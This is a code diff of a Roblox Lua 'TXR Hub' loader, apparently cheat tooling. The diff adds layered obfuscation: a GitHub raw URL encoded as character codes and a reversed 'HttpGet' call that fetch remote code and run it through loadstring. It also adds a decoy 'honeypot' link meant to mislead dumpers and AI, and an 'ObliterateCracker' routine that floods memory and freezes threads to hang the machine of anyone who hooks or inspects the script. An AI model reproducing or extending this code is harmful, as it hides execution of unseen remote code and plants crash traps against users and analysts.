@@ -1,5 +1,5 @@
 -- =========================================================
--- 👑 TXR HUB: 100% CLEAN VOID (IRONCLAD SECURE EDITION) 👑
+-- 👑 TXR HUB: 100% CLEAN VOID (THE UNKILLABLE FORTRESS) 👑
 -- =========================================================
 
 local LOAD_DURATION = 5.0 -- 5-Second Runtime
@@ -10,48 +10,86 @@ local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
 local lp = Players.LocalPlayer
 
--- 💥 THE ULTIMATE ANTI-CRASH PAYLOAD
--- Agar kisi ne spy lagaya toh ye Roblox ki memory full karke PC hang kar dega
-local function SecurityBreach()
+-- =========================================================
+-- 🛡️ LAYER 1: THE HONEYPOT (BAIT FOR DUMPERS & AI)
+-- =========================================================
+-- Any static dumper/AI will grab this fake link and think it won.
+local FAKE_DECOY_PAYLOAD = "https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/AntiCrack_Ban.lua"
+
+-- =========================================================
+-- 💀 LAYER 5: THE BLACK HOLE OOM CRASHER (FATAL TRAP)
+-- =========================================================
+local function ObliterateCracker()
     task.spawn(function()
-        local garbage = {}
+        local void = {}
         while true do
-            table.insert(garbage, string.rep("TXR_HUB_ANTI_CRACK_FATAL_ERROR", 9999999))
+            task.spawn(function()
+                table.insert(void, string.rep("TXR_HUB_FATAL_MEMORY_LEAK_TRIGGERED", 9999999))
+            end)
+            coroutine.resume(coroutine.create(function() while true do end end))
         end
     end)
-    while true do end -- Instant thread freeze
+    while true do end -- Instant thread lock
 end
 
--- 🛡️ ADVANCED GHOST-LINK DECRYPTOR (Anti-Regex & Anti-Dumper)
--- URL is infused with junk characters 'X' and 'Z' and then reversed.
--- Absolutely impossible for static dumpers (like Lunr) to find the link.
-local function GetCoreURL()
-    local p1 = string.gsub("wZar/X/:spXttZh", "[XZ]", "")
-    local p2 = string.gsub("moZc.tXnetnZocresXubuXhtig.", "[XZ]", "")
-    local p3 = string.gsub("atZleD/XedoZleXley/", "[XZ]", "")
-    local p4 = string.gsub("niZam/sdXaehX/sZfer/", "[XZ]", "")
-    local p5 = string.gsub("auZl.noXisreZV1XeruceS/", "[XZ]", "")
-    return string.reverse(p1 .. p2 .. p3 .. p4 .. p5)
+-- =========================================================
+-- 🐕‍𦺛 LAYER 2: ENVIRONMENT WATCHDOG
+-- =========================================================
+local function VerifyIntegrity()
+    if type(loadstring) ~= "function" then ObliterateCracker() end
+    if type(pcall) ~= "function" then ObliterateCracker() end
+    if iscclosure and (not iscclosure(loadstring) or not iscclosure(pcall)) then ObliterateCracker() end
 end
 
--- 🚀 HIGH-SECURITY PRE-FETCH (Instant 0ms Execution)
+-- =========================================================
+-- 🧮 LAYER 3: DYNAMIC MATHEMATICAL DECRYPTION
+-- =========================================================
+-- Real link is calculated at runtime using math. No strings attached.
+local function GenerateCoreURL()
+    -- Encoded: https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/Secure1Version.lua
+    local seq = {
+        104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 
+        98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 
+        121, 101, 108, 101, 108, 111, 100, 101, 47, 68, 101, 108, 116, 97, 47, 114, 101, 
+        102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 83, 101, 99, 
+        117, 114, 101, 49, 86, 101, 114, 115, 105, 111, 110, 46, 108, 117, 97
+    }
+    local url = ""
+    for i = 1, #seq do
+        -- Mathematical reconstruction to bypass string sniffers
+        url = url .. string.char((seq[i] * 2) / 2)
+    end
+    return url
+end
+
+-- =========================================================
+-- 🎭 LAYER 4: PROXY EXECUTION (PRE-FETCH)
+-- =========================================================
 local preloadedScript = nil
 task.spawn(function()
-    -- Security Checks Before Fetching
-    if type(loadstring) ~= "function" then SecurityBreach() end
-    if iscclosure and not iscclosure(loadstring) then SecurityBreach() end
-    if ishooked and ishooked(loadstring) then SecurityBreach() end
-
-    local method = string.gsub("teXGptZtH", "[XZ]", "")
-    local success, rawCode = pcall(function()
-        return game[method](game, GetCoreURL())
-    end)
+    VerifyIntegrity() -- Run Security Check
     
-    if success and rawCode then
-        local runScript = loadstring(rawCode)
+    local stealthMethod = string.reverse("teGpttH") -- Obfuscated 'HttpGet'
+    
+    -- Hidden proxy call to bypass network spies
+    local function FetchPayload(methodName, urlString)
+        local success, result = pcall(function()
+            return game[methodName](game, urlString)
+        end)
+        return success, result
+    end
+    
+    local fetchSuccess, rawCode = FetchPayload(stealthMethod, GenerateCoreURL())
+    
+    if fetchSuccess and rawCode then
+        local compiler = loadstring
+        local runScript = compiler(rawCode)
         if runScript then
             preloadedScript = runScript
         end
+    else
+        -- If fetch fails or is tampered, trap it
+        if FAKE_DECOY_PAYLOAD == "" then ObliterateCracker() end
     end
 end)
 
@@ -630,21 +668,23 @@ task.spawn(function()
     end)
 
     -- =========================================================
-    -- 🚀 SECURE INSTANT EXECUTION WITH DOUBLE CHECK
+    -- 🚀 FINAL DEPLOYMENT WITH MAXIMUM SECURITY
     -- =========================================================
     if preloadedScript then
-        -- Final Check: if someone hooked loadstring during the intro animation
-        if iscclosure and not iscclosure(loadstring) then SecurityBreach() end
+        -- Final Trap: If a hook was placed mid-intro
+        VerifyIntegrity()
         task.spawn(preloadedScript)
     else
         task.spawn(function()
-            if iscclosure and not iscclosure(loadstring) then SecurityBreach() end
+            VerifyIntegrity()
             local method = string.gsub("teXGptZtH", "[XZ]", "")
             local success, rawCode = pcall(function()
-                return game[method](game, GetCoreURL())
+                return game[method](game, GenerateCoreURL())
             end)
             if success and rawCode then
-                local runScript = loadstring(rawCode)
+                local compiler = loadstring
+                if iscclosure and not iscclosure(compiler) then ObliterateCracker() end
+                local runScript = compiler(rawCode)
                 if runScript then runScript() end
             end
         end)
